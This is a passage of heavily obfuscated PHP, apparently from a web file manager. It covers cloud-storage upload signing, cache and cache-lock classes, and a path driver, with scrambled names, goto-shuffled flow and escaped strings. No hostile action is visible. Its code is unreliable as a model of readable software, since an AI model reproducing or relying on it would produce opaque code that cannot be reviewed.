$DÇÎ˜ÜˆĞ…, $d‚Ñì…ª¹¤[1224] => $A›Ôï‹ˆÑ, $d‚Ñì…ª¹¤[1225] => $aÄÑ¯‰Ç, $d‚Ñì…ª¹¤[1226] => $dÖ‹ÃçßËó, $d‚Ñì…ª¹¤[1227] => $FšÔÂ Ü›Ö, $d‚Ñì…ª¹¤[175] => $this->getHost()); return $AÀß®¢”´; goto AÂŒ§è‰™ğ; a»ŠíòÁ: $d‚Ñì…ª¹¤ =& $_SERVER[Šº]; $cĞÏÃå„ˆë = $d‚Ñì…ª¹¤[191]; $A›Ôï‹ˆÑ = $d‚Ñì…ª¹¤[1210]; goto cŒØÃ”Š½; cŒØÃ”Š½: $dÚĞ‡‰Ôõã = $d‚Ñì…ª¹¤[59]; $aÄÑ¯‰Ç = gmdate($d‚Ñì…ª¹¤[1211]); $c§·µ¦»á = gmdate($d‚Ñì…ª¹¤[712]); goto e‰ÌÉ”Ä²î; Féœ‘¨‡õ: $FË»Èİä‹ = hash_hmac($d‚Ñì…ª¹¤[1220], $dÚĞ‡‰Ôõã, $f ¶¿Ò£³, !0); $bÉùĞ¾‚© = hash_hmac($d‚Ñì…ª¹¤[1220], $A¨†Ô¡Üí, $FË»Èİä‹, !0); $FšÔÂ Ü›Ö = hash_hmac($d‚Ñì…ª¹¤[1220], $Aï¯Õä½, $bÉùĞ¾‚©); goto Dœ•™Ü´÷; AÂŒ§è‰™ğ: } public function multiUploadFormData($fÒÑòå¹ó™, $d«ˆÉ„Ÿ…÷ = 3600) { $BòË³¥˜† =& $_SERVER[Šº]; $cäÁÖÁŠ°Ó = gmdate($BòË³¥˜†[1306]); $CÒÓŸà³ñç = array(); $b‹ª¶í¡£‘ = $this->client->getUploadId($this->bucket, $fÒÑòå¹ó™, $CÒÓŸà³ñç); if (!$b‹ª¶í¡£‘) { return !1; } return array($BòË³¥˜†[220] => $b‹ª¶í¡£‘, $BòË³¥˜†[175] => $this->getHost() . $BòË³¥˜†[8] . $this->pathEncode($fÒÑòå¹ó™), $BòË³¥˜†[221] => $cäÁÖÁŠ°Ó, $BòË³¥˜†[93] => $fÒÑòå¹ó™); } public function multiUploadAuthData($eÑÎéã¤ï , $Eç”Á½ö…± = array()) { goto BÊˆçÁŞé; BÊˆçÁŞé: $CÙ¥Ä³ÎÇ =& $_SERVER[Šº]; $b¹ÀÅª„© = isset($Eç”Á½ö…±[$CÙ¥Ä³ÎÇ[168]]) ? $Eç”Á½ö…±[$CÙ¥Ä³ÎÇ[168]] : $CÙ¥Ä³ÎÇ[33]; $DƒÔÊÌ³ÃÏ = $Eç”Á½ö…±[$CÙ¥Ä³ÎÇ[93]]; goto Cˆ¢è³Ù”ñ; Cîù¿óøöè: if (strpos($b¹ÀÅª„©, $CÙ¥Ä³ÎÇ[224]) === 0) { if (isset($Bá—ìß»õÁ[$CÙ¥Ä³ÎÇ[1308]])) { $B¹‡Û•¤†ö = $Bá—ìß»õÁ[$CÙ¥Ä³ÎÇ[1308]]; } else { if (isset($DˆÍë¡ìçŸ[$CÙ¥Ä³ÎÇ[1308]])) { $B¹‡Û•¤†ö = $DˆÍë¡ìçŸ[$CÙ¥Ä³ÎÇ[1308]]; } else { $B¹‡Û•¤†ö = hash($CÙ¥Ä³ÎÇ[1220], $CÙ¥Ä³ÎÇ[33]); } } return array($CÙ¥Ä³ÎÇ[231] => $DˆÍë¡ìçŸ[$CÙ¥Ä³ÎÇ[231]], $CÙ¥Ä³ÎÇ[1308] => $B¹‡Û•¤†ö, $CÙ¥Ä³ÎÇ[221] => $DˆÍë¡ìçŸ[$CÙ¥Ä³ÎÇ[1311]]); } return $DˆÍë¡ìçŸ[$CÙ¥Ä³ÎÇ[231]]; goto A±ëÕë–Ø¡; F‹³êÁğ’î: $BÕ¦¦™äÍ = $CÙ¥Ä³ÎÇ[225]; $a²çÔ»ç´ = $CÙ¥Ä³ÎÇ[8] . $this->pathEncode($DƒÔÊÌ³ÃÏ) . $b¹ÀÅª„©; $DˆÍë¡ìçŸ = $this->client->__getSignatureV4($Bá—ìß»õÁ, $CéŒª¨Ëœ‚, $BÕ¦¦™äÍ, $a²çÔ»ç´); goto Cîù¿óøöè; Cˆ¢è³Ù”ñ: unset($Eç”Á½ö…±[$CÙ¥Ä³ÎÇ[93]]); if (isset($Eç”Á½ö…±[$CÙ¥Ä³ÎÇ[222]])) { return $this->listUploadParts($DƒÔÊÌ³ÃÏ, $Eç”Á½ö…±); } $Bá—ìß»õÁ = array(); goto eºáÆ¿““¤; eºáÆ¿““¤: if (isset($Eç”Á½ö…±[$CÙ¥Ä³ÎÇ[1307]])) { $Bá—ìß»õÁ[$CÙ¥Ä³ÎÇ[1308]] = $Eç”Á½ö…±[$CÙ¥Ä³ÎÇ[1307]]; } $a—¸Úè–­Ñ = explode($CÙ¥Ä³ÎÇ[177], $this->getHost()); $CéŒª¨Ëœ‚ = array($CÙ¥Ä³ÎÇ[1309] => $a—¸Úè–­Ñ[1], $CÙ¥Ä³ÎÇ[1310] => $CÙ¥Ä³ÎÇ[33], $CÙ¥Ä³ÎÇ[210] => $CÙ¥Ä³ÎÇ[119], $CÙ¥Ä³ÎÇ[1222] => $Eç”Á½ö…±[$CÙ¥Ä³ÎÇ[78]]); goto F‹³êÁğ’î; A±ëÕë–Ø¡: } public function listUploadParts($D­œÚ†®», $d™ÏóíÀ = array()) { goto CŠ‚Ğ‡©°–; a÷çõÔ»­: $b¸ó±è£ÒŞ = $this->client->__getSignatureV4($B±’ÊÄÌÉ‘, $D¤ºƒµÙ—˜, $c¯Ü˜ º…¾, $eğêñ…¡±´, $C­™æ­ƒÓ³); return array($eÈåç£²¨‰[231] => $b¸ó±è£ÒŞ[$eÈåç£²¨‰[231]], $eÈåç£²¨‰[221] => $b¸ó±è£ÒŞ[$eÈåç£²¨‰[1311]], $eÈåç£²¨‰[233] => $Cîª¹†ÂÛ, $eÈåç£²¨‰[1308] => $b¸ó±è£ÒŞ[$eÈåç£²¨‰[1308]]); goto E•ç•›òäì; cÅŞÄ¥‚–®: $D¤ºƒµÙ—˜ = array($eÈåç£²¨‰[1309] => $d§ä—ß©—[1], $eÈåç£²¨‰[210] => $eÈåç£²¨‰[119], $eÈåç£²¨‰[1222] => strlen($C­™æ­ƒÓ³)); $c¯Ü˜ º…¾ = $eÈåç£²¨‰[223]; $eğêñ…¡±´ = $eÈåç£²¨‰[8] . $this->pathEncode($D­œÚ†®») . $d™ÏóíÀ[$eÈåç£²¨‰[168]]; goto a÷çõÔ»­; CŠ‚Ğ‡©°–: $eÈåç£²¨‰ =& $_SERVER[Šº]; $bŠÔõ†£ã” = str_replace($eÈåç£²¨‰[232], $eÈåç£²¨‰[33], $d™ÏóíÀ[$eÈåç£²¨‰[168]]); $Cîª¹†ÂÛ = $this->client->listParts($this->bucket, $D­œÚ†®», $bŠÔõ†£ã”); goto c­¹£òêË; c­¹£òêË: if (!$Cîª¹†ÂÛ) { return !1; } $C­™æ­ƒÓ³ = $eÈåç£²¨‰[1312]; foreach ($Cîª¹†ÂÛ as $c§‘…¹«†Ã) { $C­™æ­ƒÓ³ .= $eÈåç£²¨‰[1313] . "\74\x50\x61\162\164\x4e\165\x6d\x62\x65\162\x3e{$c§‘…¹«†Ã[$eÈåç£²¨‰[1268]]}\x3c\57\120\x61\162\x74\116\165\155\x62\145\162\76\12" . "\74\105\x54\141\x67\x3e{$c§‘…¹«†Ã[$eÈåç£²¨‰[1269]]}\74\x2f\x45\124\x61\x67\x3e\12" . $eÈåç£²¨‰[1314]; } goto d®ºÉ¹ÚáÎ; d®ºÉ¹ÚáÎ: $C­™æ­ƒÓ³ .= $eÈåç£²¨‰[1315]; $B±’ÊÄÌÉ‘ = array(); $d§ä—ß©— = explode($eÈåç£²¨‰[177], $this->getHost()); goto cÅŞÄ¥‚–®; E•ç•›òäì: } public function link($dÜ·˜ñÔ¼ğ, $EÛ¨ÜÇƒ = array()) { return parent::link($dÜ·˜ñÔ¼ğ, $EÛ¨ÜÇƒ); } public function fileOut($FÜ­•ˆ¼„ï, $EâãåÓô‹ = false, $A‘¹–ä•ë = false, $A°¢ŠµÂ‹ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Šº][1316])) { return parent::fileOutServer($FÜ­•ˆ¼„ï, $EâãåÓô‹, $A‘¹–ä•ë, $A°¢ŠµÂ‹); } parent::fileOut($FÜ­•ˆ¼„ï, $EâãåÓô‹, $A‘¹–ä•ë, $A°¢ŠµÂ‹); } public function fileOutImage($dçÌÎñƒÉÀ, $a„ˆÉåª´± = 250) { if (strstr($this->endpoint, $_SERVER[Šº][1316])) { return parent::fileOutImageServer($dçÌÎñƒÉÀ, $a„ˆÉåª´±); } parent::fileOutImage($dçÌÎñƒÉÀ, $a„ˆÉåª´±); } public function fileOutLink($d„¢’ÈÌÈ) { $EŸÑ¼í¢Úâ =& $_SERVER[Šº]; if (substr($d„¢’ÈÌÈ, 0, 7) == $EŸÑ¼í¢Úâ[1190]) { $d„¢’ÈÌÈ = $EŸÑ¼í¢Úâ[1191] . substr($d„¢’ÈÌÈ, 7); } header($EŸÑ¼í¢Úâ[159] . $d„¢’ÈÌÈ); die; } public function getHost() { $c±Â®ÙŠÉ =& $_SERVER[Šº]; $dù½Ş‡¡óë = str_rtrim(parent::getHost(), $c±Â®ÙŠÉ[8] . $this->bucket); $dù½Ş‡¡óë = explode($c±Â®ÙŠÉ[177], $dù½Ş‡¡óë); return $dù½Ş‡¡óë[0] . $c±Â®ÙŠÉ[177] . $this->bucket . $c±Â®ÙŠÉ[95] . $dù½Ş‡¡óë[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($DŒ›®ÓãÃ¼, $BÔÅó‚Üõ‚ = 0) { parent::__construct(); $this->source = $DŒ›®ÓãÃ¼; $this->sourceSize = $BÔÅó‚Üõ‚; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($fÌœ¾†îØŠ = false) { return $this->sourceSize; } public function getContent($CŠ˜êñ”Ò = false) { return $this->fileSubstr($CŠ˜êñ”Ò, 0, $this->sourceSize); } public function fileSubstr($f¨¾Ğ“Ğ†· = false, $d™„Ï“÷Õ = 0, $f®øËÛšÑª = 0) { if (!$f®øËÛšÑª) { $f®øËÛšÑª = $this->sourceSize; } $E‘æ‘¢º× = $this->sourceSize - $d™„Ï“÷Õ; if ($f®øËÛšÑª >= $E‘æ‘¢º×) { $f®øËÛšÑª = $E‘æ‘¢º×; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $d™„Ï“÷Õ, $f®øËÛšÑª); } if ($this->sourceType == self::TYPE_FILE) { if ($f®øËÛšÑª <= 0) { return $_SERVER[Šº][33]; } $F¼ÆÚÜ ¸ = ftell($this->source); fseek_64($this->source, $F¼ÆÚÜ ¸ + $d™„Ï“÷Õ); $dÌøå¥õáï = @fread($this->source, $f®øËÛšÑª); fseek_64($this->source, $F¼ÆÚÜ ¸); return $dÌøå¥õáï; } } public function hashMd5($CèÆåÈˆ‹Œ = false) { return md5($this->getContent()); } public static function hash($F¦éò™çÖ‹, $B¤ºŒç»‰ = 0) { $DÁ¯©´õÎ = new PathDriverStream($F¦éò™çÖ‹, $B¤ºŒç»‰); return $DÁ¯©´õÎ->hashSimple($F¦éò™çÖ‹); } public static function md5($dø‚Ú·­Œ, $aĞ“Ü‡â¬Š = 0) { $dºÒŸÈ¿¡³ = new PathDriverStream($dø‚Ú·­Œ, $aĞ“Ü‡â¬Š); return $dºÒŸÈ¿¡³->hashMd5($dø‚Ú·­Œ); } } goto CğŸ”Š‰ñ; AƒÈÇÊÙ¨¾: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto aë¡³…•î¨; d‰¿Ü¤Áó°: switch ($EÁ°ÌÄ¯[$e©ÔáÌ¿Õ[790]]) { case $e©ÔáÌ¿Õ[17]: self::$handle = Model($e©ÔáÌ¿Õ[792]); break; case $e©ÔáÌ¿Õ[793]: self::$handle = new CacheRedis($e¾›Õœ±Ê‰, $EâÜçó‘); break; case $e©ÔáÌ¿Õ[794]: self::$handle = new CacheMemcached($e¾›Õœ±Ê‰, $EâÜçó‘); break; case $e©ÔáÌ¿Õ[192]: self::$handle = new CacheFile($e¾›Õœ±Ê‰, $EâÜçó‘); break; default: break; } return self::$handle; goto eô¡œçï•º; aë¡³…•î¨: $e©ÔáÌ¿Õ =& $_SERVER[Šº]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto F‰İàêĞ°·; F‰İàêĞ°·: $EÁ°ÌÄ¯ = $GLOBALS[$e©ÔáÌ¿Õ[6]][$e©ÔáÌ¿Õ[346]]; $e¾›Õœ±Ê‰ = $EÁ°ÌÄ¯[$EÁ°ÌÄ¯[$e©ÔáÌ¿Õ[790]]]; $EâÜçó‘ = $EÁ°ÌÄ¯[$e©ÔáÌ¿Õ[791]]; goto d‰¿Ü¤Áó°; eô¡œçï•º: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($DÈ¹ã–öŒ) { if (is_array($DÈ¹ã–öŒ) || is_object($DÈ¹ã–öŒ)) { $DÈ¹ã–öŒ = json_encode($DÈ¹ã–öŒ); } $DÈ¹ã–öŒ = rawurlencode($DÈ¹ã–öŒ); return md5(KOD_SITE_ID . $_SERVER[Šº][71] . $DÈ¹ã–öŒ); } public static function get($e³ò¼µ«ÆŒ, $Dôİ›÷‘æ„ = false) { $d¦‡Îƒ¹ÜÌ = self::key($e³ò¼µ«ÆŒ); if ($Dôİ›÷‘æ„) { return unserialize(self::init()->get($d¦‡Îƒ¹ÜÌ)); } if (!isset(self::$memoryCache[$d¦‡Îƒ¹ÜÌ])) { $b‹¨º°½ = self::init()->get($d¦‡Îƒ¹ÜÌ); self::$memoryCache[$d¦‡Îƒ¹ÜÌ] = unserialize($b‹¨º°½); } return self::$memoryCache[$d¦‡Îƒ¹ÜÌ]; } public static function set($Eƒ•â½‹ŠÚ, $e‚”¬ó¥, $BåçÅ·ñÌÕ = false) { goto f‡œìÌÚ; Bˆ¡÷…Îˆó: CacheLock::lock($Eƒ•â½‹ŠÚ); $c¼Ùá‚°¶ = self::init()->set($f§¾‘ˆªé, serialize($e‚”¬ó¥), $BåçÅ·ñÌÕ); self::$memoryCache[$f§¾‘ˆªé] = $e‚”¬ó¥; goto FÜ‡áÎÇ¥Õ; f‡œìÌÚ: $f§¾‘ˆªé = self::key($Eƒ•â½‹ŠÚ); if (isset(self::$memoryCache[$f§¾‘ˆªé]) && self::$memoryCache[$f§¾‘ˆªé] === $e‚”¬ó¥) { return !0; } if ($BåçÅ·ñÌÕ === 0) { self::$memoryCache[$f§¾‘ˆªé] = $e‚”¬ó¥; return !0; } goto Bˆ¡÷…Îˆó; FÜ‡áÎÇ¥Õ: CacheLock::unlock($Eƒ•â½‹ŠÚ); return $c¼Ùá‚°¶; goto eˆ´ØœÃØ†; eˆ´ØœÃØ†: } public static function getCall($dğé¦®¯Œ, $DÕ—”ˆŸè, $aÍÂé°™ß, $fìù¤Šõ®õ = array()) { $b¢ ¸ê±Ñ³ = self::get($dğé¦®¯Œ); if ($b¢ ¸ê±Ñ³) { return $b¢ ¸ê±Ñ³; } $b¢ ¸ê±Ñ³ = call_user_func_array($aÍÂé°™ß, $fìù¤Šõ®õ); self::set($dğé¦®¯Œ, $b¢ ¸ê±Ñ³, $DÕ—”ˆŸè); return $b¢ ¸ê±Ñ³; } public static function remove($aÓ¶‰éÌ¸) { goto c©Ä‘½•‰; c©Ä‘½•‰: $Dîæ÷‰² = self::key($aÓ¶‰éÌ¸); unset(self::$memoryCache[$Dîæ÷‰²]); self::clearTimeout(); goto Fİë‰“ˆï‹; Cİ¯ŒƒÌÒ½: return $FÊƒÔÈÉÃ›; goto f°¬ØÈêÛ’; Fİë‰“ˆï‹: CacheLock::lock($aÓ¶‰éÌ¸); $FÊƒÔÈÉÃ› = self::init()->remove($Dîæ÷‰²); CacheLock::unlock($aÓ¶‰éÌ¸); goto Cİ¯ŒƒÌÒ½; f°¬ØÈêÛ’: } public static function removeMemory($dÎÇæ°«ÅŒ) { $DÔÅë¦¼…´ = self::key($dÎÇæ°«ÅŒ); unset(self::$memoryCache[$DÔÅë¦¼…´]); } public static function clearMemory($aÅ²Ÿ²ö¼Ã = false) { if ($aÅ²Ÿ²ö¼Ã) { $aÅ²Ÿ²ö¼Ã = self::key($aÅ²Ÿ²ö¼Ã); unset(self::$memoryCache[$aÅ²Ÿ²ö¼Ã]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Šº][795])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Šº][796])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($e‚™ö÷Ï£¬, $dÒ™†œÙïê) { $CŸ—Œ¼¢‡à =& $_SERVER[Šº]; $this->cachePath = $e‚™ö÷Ï£¬[$CŸ—Œ¼¢‡à[76]]; $this->prefix = $CŸ—Œ¼¢‡à[797]; $this->cacheTime = $dÒ™†œÙïê; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($D¬š¿½çÆ§) { $f‡‹»˜ãï° =& $_SERVER[Šº]; $D¬š¿½çÆ§ = str_replace(array($f‡‹»˜ãï°[798], $f‡‹»˜ãï°[97], $f‡‹»˜ãï°[70]), $f‡‹»˜ãï°[799], $D¬š¿½çÆ§); return $this->cachePath . $f‡‹»˜ãï°[800] . $D¬š¿½çÆ§ . $f‡‹»˜ãï°[801]; } public function set($dæ¸Ğà„ÎÆ, $B×‹Š¤ˆÉ, $e¹ƒˆ¦ª¦ô = false) { $dõò‹²íË = $this->getFile($dæ¸Ğà„ÎÆ); if (file_put_contents($dõò‹²íË, $this->prefix . $B×‹Š¤ˆÉ, LOCK_EX)) { return !0; } @unlink($dõò‹²íË); return !1; } public function get($Cˆ»‰Æáß) { $cæÏŞ®Éà¡ = $this->getFile($Cˆ»‰Æáß); if (file_exists($cæÏŞ®Éà¡) && filemtime($cæÏŞ®Éà¡) < time() - $this->cacheTime) { @unlink($cæÏŞ®Éà¡); return !1; } $b•—õ–ÖŸä = @file_get_contents($cæÏŞ®Éà¡); return substr($b•—õ–ÖŸä, strlen($this->prefix)); } public function remove($C·ÎäßÚ±ˆ) { $eŸŸö±äˆ = $this->getFile($C·ÎäßÚ±ˆ); return @unlink($eŸŸö±äˆ); } public function deleteAll() { $fÚÃ„™‘ˆ =& $_SERVER[Šº]; $AÍ¯ëäÆå© = scandir($this->cachePath); foreach ($AÍ¯ëäÆå© as $CÓÈ¨ Ä”) { $BÙÊóÀö®ã = $this->cachePath . $CÓÈ¨ Ä”; if (strpos($BÙÊóÀö®ã, $fÚÃ„™‘ˆ[801]) && strpos($BÙÊóÀö®ã, $fÚÃ„™‘ˆ[802])) { @unlink($BÙÊóÀö®ã); } } } public function clearTimeout() { $eè¦á±¾±” =& $_SERVER[Šº]; $Aø‰İ›´ÕŠ = scandir($this->cachePath); foreach ($Aø‰İ›´ÕŠ as $dÙ•Òã¹Ã’) { $D×­Ûô» = $this->cachePath . $dÙ•Òã¹Ã’; if (strpos($D×­Ûô», $eè¦á±¾±”[801]) && strpos($D×­Ûô», $eè¦á±¾±”[802]) && filemtime($D×­Ûô») < time() - $this->cacheTime) { @unlink($D×­Ûô»); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DÈíÒñ­£‡; DÈíÒñ­£‡: $cİ¨¾ö±”¨ =& $_SERVER[Šº]; if (self::$handle) { return self::$handle; } $açíë÷¬±Ã = $GLOBALS[$cİ¨¾ö±”¨[6]][$cİ¨¾ö±”¨[346]]; goto b™ğ“Ó‰â; C¢ÊŠùíÄ: if ($bºê…÷öÃ == $cİ¨¾ö±”¨[17] && $fì™ù«á‘ == $cİ¨¾ö±”¨[9]) { $bºê…÷öÃ = $cİ¨¾ö±”¨[192]; } switch ($bºê…÷öÃ) { case $cİ¨¾ö±”¨[793]: self::$handle = new CacheLockRedis(); break; case $cİ¨¾ö±”¨[794]: self::$handle = new CacheLockMemcached(); break; case $cİ¨¾ö±”¨[17]: self::$handle = new CacheLockDatabase(); break; case $cİ¨¾ö±”¨[192]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto CŠùÇ¬à†‰; b™ğ“Ó‰â: self::$timeout = $açíë÷¬±Ã[$cİ¨¾ö±”¨[803]] ? $açíë÷¬±Ã[$cİ¨¾ö±”¨[803]] : 10; $fì™ù«á‘ = _get($GLOBALS[$cİ¨¾ö±”¨[6]], $cİ¨¾ö±”¨[804]); $bºê…÷öÃ = $açíë÷¬±Ã[$cİ¨¾ö±”¨[790]] ? $açíë÷¬±Ã[$cİ¨¾ö±”¨[790]] : $cİ¨¾ö±”¨[192]; goto C¢ÊŠùíÄ; CŠùÇ¬à†‰: } private static function key($AÜôíâŸ¨) { return $_SERVER[Šº][805] . Cache::key($AÜôíâŸ¨); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($FÄ‰İìİÍ = '') { self::$errorMsg = $FÄ‰İìİÍ; } public static function lockGlobal($D‚‰ÆŸÄ, $e¿ÇØãÙÍ‘) { return self::lock($D‚‰ÆŸÄ, $e¿ÇØãÙÍ‘, !0); } public static function lock($b ‡¦©³È, $Bµ©É¶ñâ = false, $D’Æâ éåš = false) { goto CÎ„£ä£; CÎ„£ä£: $CİÊ¢¾´áç =& $_SERVER[Šº]; $F¡¡¬‚§Ú‘ = self::init(); $aŠ¹’¢°ÑÓ = self::key($b ‡¦©³È); goto F‚‘¼×ĞˆÇ; F‚‘¼×ĞˆÇ: $Bµ©É¶ñâ = $Bµ©É¶ñâ ? $Bµ©É¶ñâ : self::$timeout; $d©ô·Ü‰”  = $F¡¡¬‚§Ú‘->lock($aŠ¹’¢°ÑÓ, $Bµ©É¶ñâ); if (!$d©ô·Ü‰” ) { $d‚¢ÓáĞˆô = "\x6c\x6f\143\153\40\145\162\x72\x6f\x72\x3b\153\x65\x79\75{$b ‡¦©³È}\x3b\164\151\155\145\x3d{$Bµ©É¶ñâ}\x3b" . self::$errorMsg . $CİÊ¢¾´áç[68] . get_caller_msg(); $eÃÑŒØâ³ß = LNG($CİÊ¢¾´áç[806]) . "\50{$Bµ©É¶ñâ}\163\51\x2e" . LNG($CİÊ¢¾´áç[807]); $eÃÑŒØâ³ß .= $CİÊ¢¾´áç[808]; if (is_string(self::$errorMsg) && self::$errorMsg) { $eÃÑŒØâ³ß = $eÃÑŒØâ³ß . $CİÊ¢¾´áç[809] . self::$errorMsg; } write_log($d‚¢ÓáĞˆô, $CİÊ¢¾´áç[810]); show_json($eÃÑŒØâ³ß, !1); } goto Dï†›ÌÑ©¿; Dï†›ÌÑ©¿: if (!$D’Æâ éåš) { self::$lockItem[$aŠ¹’¢°ÑÓ] = !0; } return $d©ô·Ü‰” ; goto DİÑÅí‹–; DİÑÅí‹–: } public static function lockGet($c˜”‡ê®¤”) { $c÷‚è’™—Ğ = self::key($c˜”‡ê®¤”); if (self::$lockItem[$c÷‚è’™—Ğ]) { return self::$lockItem[$c÷‚è’™—Ğ]; } return self::init()->lockGet($c÷‚è’™—Ğ); } public static function unlock($e·øçØñ¾ ) { $AÏ‡Äçöá¤ = self::key($e·øçØñ¾ ); self::$lockItem[$AÏ‡Äçöá¤] = null; return self::init()->unlock($AÏ‡Äçöá¤); } public static function unlockRuntime() { $C¨Š§Ó¨Œ =& $_SERVER[Šº]; $eÍùòÕšğ¹ = self::init(); $f…÷ãÁØ©Ä = !1; foreach (self::$lockItem as $cä´Âà°Õ„ => $EÙé§»¢ñ) { if (!$EÙé§»¢ñ) { continue; } $eÍùòÕšğ¹->unlock($cä´Âà°Õ„); if (!$f…÷ãÁØ©Ä) { $f…÷ãÁØ©Ä = !0; write_log($C¨Š§Ó¨Œ[811] . $cä´Âà°Õ„ . $C¨Š§Ó¨Œ[68] . get_caller_msg(), $C¨Š§Ó¨Œ[810]); continue; } write_log($C¨Š§Ó¨Œ[811] . $cä´Âà°Õ„, $C¨Š§Ó¨Œ[810]); } self::fileUnlockAll(); } public static function fileLock($dÁâ˜®áµ ) { goto f¹é‡Çç; Eóóµ‰ ƒ¿: $FˆçŒÕäéİ = fopen(DATA_PATH . $dÁâ˜®áµ  . $EàÙÛŠç´ä[813], $EàÙÛŠç´ä[814]); if (!$FˆçŒÕäéİ) { return !1; } $GLOBALS[$EàÙÛŠç´ä[812]][$dÁâ˜®áµ ] = $FˆçŒÕäéİ; goto fåãíÅ„ôó; fåãíÅ„ôó: if (flock($FˆçŒÕäéİ, LOCK_EX)) { return !0; } self::unlock($dÁâ˜®áµ ); show_json($EàÙÛŠç´ä[815], !1); goto c©Æ¼¡ªˆ; c©Æ¼¡ªˆ: return !1; goto d’ƒË©÷§; f¹é‡Çç: $EàÙÛŠç´ä =& $_SERVER[Šº]; if (!$GLOBALS[$EàÙÛŠç´ä[812]]) { $GLOBALS[$EàÙÛŠç´ä[812]] = array(); } $GLOBALS[$EàÙÛŠç´ä[812]][$dÁâ˜®áµ ] = !1; goto Eóóµ‰ ƒ¿; d’ƒË©÷§: } public static function fileUnlock($A·¢˜Üö¢Î) { $D’‡—¹‰Ù =& $_SERVER[Šº]; $Cº‡‰Ä™Œ = $GLOBALS[$D’‡—¹‰Ù[812]][$A·¢˜Üö¢Î]; if (!$Cº‡‰Ä™Œ) { return; } $GLOBALS[$D’‡—¹‰Ù[812]][$A·¢˜Üö¢Î] = !1; flock($Cº‡‰Ä™Œ, LOCK_UN); fclose($Cº‡‰Ä™Œ); } public static function fileUnlockAll() { $D »âÖÛÚ‘ =& $_SERVER[Šº]; if (!$GLOBALS[$D »âÖÛÚ‘[812]]) { return; } foreach ($GLOBALS[$D »âÖÛÚ‘[812]] as $e×Éì´øœ => $Cñ”·¾ÙƒÕ) { if (!$Cñ”·¾ÙƒÕ) { continue; } $GLOBALS[$D »âÖÛÚ‘[812]][$e×Éì´øœ] = !1; flock($Cñ”·¾ÙƒÕ, LOCK_UN); fclose($Cñ”·¾ÙƒÕ); } $GLOBALS[$D »âÖÛÚ‘[812]] = array(); } } goto E­„ß¨ê›Í; f÷œğ­…: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $E÷Æ”¾§ŸÂ =& $_SERVER[Šº]; $this->objectDriver = array($E÷Æ”¾§ŸÂ[57], $E÷Æ”¾§ŸÂ[58], $E÷Æ”¾§ŸÂ[59], $E÷Æ”¾§ŸÂ[60], $E÷Æ”¾§ŸÂ[61], $E÷Æ”¾§ŸÂ[62], $E÷Æ”¾§ŸÂ[63], $E÷Æ”¾§ŸÂ[64], $E÷Æ”¾§ŸÂ[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Dİ‚ß‰’¬ß) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Dİ‚ß‰’¬ß, $_SERVER[Šº][8]); } return $Dİ‚ß‰’¬ß; } public function iconvApp($c†ÁÅ´¦ğÙ) { return $c†ÁÅ´¦ğÙ; } public function iconvSystem($fÜôÅëÚ‰) { return $fÜôÅëÚ‰; } public function iconvTo($B¼Ö»Ë‡¡, $eº·ğÙ±Ê, $a¸ç¤Ó“) { goto eÉ ‚äà; aÕ¦Œã‰ø•: return $E›È˜Ê·ß®; goto aÒÄß†ê¥Ø; E¹à¥¢Ö‰: $fš’ùÍ¨¦’[$a¸ç¤Ó“ . $c¿§ËŠª×¾[67] . $eº·ğÙ±Ê . $c¿§ËŠª×¾[68] . $B¼Ö»Ë‡¡] = $B¼Ö»Ë‡¡; $fš’ùÍ¨¦’[$a¸ç¤Ó“ . $c¿§ËŠª×¾[67] . $eº·ğÙ±Ê . $c¿§ËŠª×¾[68] . $E›È˜Ê·ß®] = $B¼Ö»Ë‡¡; $fš’ùÍ¨¦’[$eº·ğÙ±Ê . $c¿§ËŠª×¾[67] . $a¸ç¤Ó“ . $c¿§ËŠª×¾[68] . $E›È˜Ê·ß®] = $E›È˜Ê·ß®; goto aÕ¦Œã‰ø•; Cî§ÙÅĞè: $dôùóœ¶äÄ = $eº·ğÙ±Ê . $c¿§ËŠª×¾[67] . $a¸ç¤Ó“ . $c¿§ËŠª×¾[68] . $B¼Ö»Ë‡¡; if (isset($fš’ùÍ¨¦’[$dôùóœ¶äÄ])) { return $fš’ùÍ¨¦’[$dôùóœ¶äÄ]; } if (function_exists($c¿§ËŠª×¾[69])) { $E›È˜Ê·ß® = @mb_convert_encoding($B¼Ö»Ë‡¡, $a¸ç¤Ó“, $eº·ğÙ±Ê); } else { $E›È˜Ê·ß® = @iconv($eº·ğÙ±Ê, $a¸ç¤Ó“, $B¼Ö»Ë‡¡); } goto aÀëÕİœÄ³; eÉ ‚äà: $c¿§ËŠª×¾ =& $_SERVER[Šº]; if (!$B¼Ö»Ë‡¡ || !function_exists($c¿§ËŠª×¾[66])) { return $B¼Ö»Ë‡¡; } static $fš’ùÍ¨¦’ = array(); goto Cî§ÙÅĞè; aÀëÕİœÄ³: $E›È˜Ê·ß® = $E›È˜Ê·ß® ? $E›È˜Ê·ß® : $B¼Ö»Ë‡¡; if (strstr($E›È˜Ê·ß®, $c¿§ËŠª×¾[70])) { $E›È˜Ê·ß® = str_replace($c¿§ËŠª×¾[70], $c¿§ËŠª×¾[71], $E›È˜Ê·ß®); } $fš’ùÍ¨¦’[$eº·ğÙ±Ê . $c¿§ËŠª×¾[67] . $a¸ç¤Ó“ . 